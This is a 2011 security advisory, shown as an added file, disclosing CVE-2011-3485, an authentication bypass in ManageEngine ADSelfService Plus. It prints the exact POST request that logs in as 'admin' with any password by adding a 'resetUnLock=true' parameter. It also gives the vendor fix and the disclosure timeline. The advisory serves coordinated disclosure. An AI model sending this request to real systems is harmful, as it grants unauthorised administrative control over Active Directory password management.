@@ -1,0 +1,117 @@
+ZOHO ManageEngine ADSelfService Plus Administrative Access
+==========================================================
+
+[ADVISORY INFORMATION]
+Title:		ZOHO ManageEngine ADSelfService Plus Administrative Access
+Release date: 	10/10/2011
+Last update: 	10/10/2011
+Credits: 	Roberto Paleari, Emaze Networks S.p.A. (roberto.paleari@emaze.net)
+Advisory URL:   http://blog.emaze.net/2011/10/zoho-manageengine-adselfservice-plus.html
+
+[VULNERABILITY INFORMATION]
+Class: 	       Authentication issue, Administrative access
+CVE: 	       CVE-2011-3485
+
+[AFFECTED SOFTWARE]
+    * ADSelfService Plus 4.5 Build 4521
+Previous versions are probably also vulnerable, but they were not checked.
+
+[VULNERABILITY DETAILS]
+ManageEngine ADSelfService Plus is a web-based password management
+infrastructure for Microsoft Windows Active Directory environments.
+
+By default a local administrative account is configured, named "admin". The
+administrative password is stored inside the local database in base64(md5(P|S))
+form (P is the plain-text password, S is a password salt, and '|' is the string
+concatenation operator). In the default installation, password for user "admin"
+is also "admin", but the password can be changed after first login.
+
+Unfortunately, due to a bug in the authentication procedure, malicious users
+can authenticate without knowing the current plain-text password value.
+
+Normal logins are eventually performed through POST requests similar to the
+following:
+
+<cut>
+POST /j_security_check HTTP/1.1
+Host: ...
+Content-Length: ...
+
+j_username=user&j_password=pass&domainName=domain&DIGEST=captcha&AUTHRULE_NAME=ADAuthenticator&domainAuthen=true
+</cut>
+
+However, due to a software defect, if a malicious user tries to log as the
+"admin" user and adds to the POST body an additional parameter named
+"resetUnLock" with value "true", then the application skips the password check
+(i.e., you can supply any password and login succeeds).
+
+As an example, an attacker can issue the following POST request to authenticate
+as the "admin" user:
+
+<cut>
+POST /j_security_check HTTP/1.1
+Host: ...
+Content-Length: ...
+
+j_username=admin&j_password=any&domainName=domain&DIGEST=captcha&AUTHRULE_NAME=ADAuthenticator&domainAuthen=true&resetUnLock=true
+</cut>
+
+[REMEDIATION]
+Zoho included a fix to address this issue in ADSelfService Plus Build
+4522. Emaze would like to thanks D. Ashok Kumar, of the ManageEngine
+ADSelfService Plus team, for having coordinated the vulnerability handling
+process.
+
+[REPORT TIMELINE]
+    * 26/08/2011 - Initial vendor contact. Publication date set to September
+      20th, 2011.
+
+    * 02/09/2011 - Vendor replied, asking for a phone contact number to discuss
+      the details of the issue.
+
+    * 03/09/2011 - Emaze asked to keep all the communication through e-mail, in
+      order to keep track of the whole conversation. Publication date delayed
+      to September 24th, 2011.
+
+    * 06/09/2011 - Zoho answered, providing a GPG key to secure the
+      communication.
+
+    * 08/09/2011 - Emaze replied with the vulnerability details.
+
+    * 15/09/2011 - Emaze asked to Zoho a status update about the vulnerability
+      handling process.
+
+    * 15/09/2011 - Zoho confirmed the vulnerability has been fixed, and the
+      patch will be included in the upcoming ADSelfService Plus Build 4522
+      release. According to Zoho, the new product build should be released "in
+      a couple of weeks".
+
+    * 15/09/2011 - Emaze replied asking if the current publication date
+      (September 24th) is still appropriate.
+
+    * 20/09/2011 - Zoho asked to move the publication date after the first week
+      of October.
+
+    * 21/09/2011 - Emaze set a new publication date to October 7th, 2011.
+
+    * 10/10/2011 - Zoho released ADSelfService Plus Build 4522, which fixes the
+      security vulnerability.
+
+    * 11/10/2011 - Public disclosure.
+
+[COPYRIGHT]
+Copyright(c) Emaze Networks S.p.A. 2011, All rights reserved worldwide.
+Permission is hereby granted to redistribute this advisory, providing that no
+changes are made and that the copyright notices and disclaimers remain intact.
+
+Emaze Networks has updated ipLegion, its vulnerability assessment platform, to
+check for this vulnerability. Contact info@emaze.net to have more information
+about ipLegion.
+
+[DISCLAIMER]
+Emaze Networks S.p.A. is not responsible for the misuse of the information
+provided in our security advisories. These advisories are a service to the
+professional security community. There are NO WARRANTIES with regard to this
+information. Any application or distribution of this information constitutes
+acceptance AS IS, at the user's own risk. This information is subject to change
+without notice.
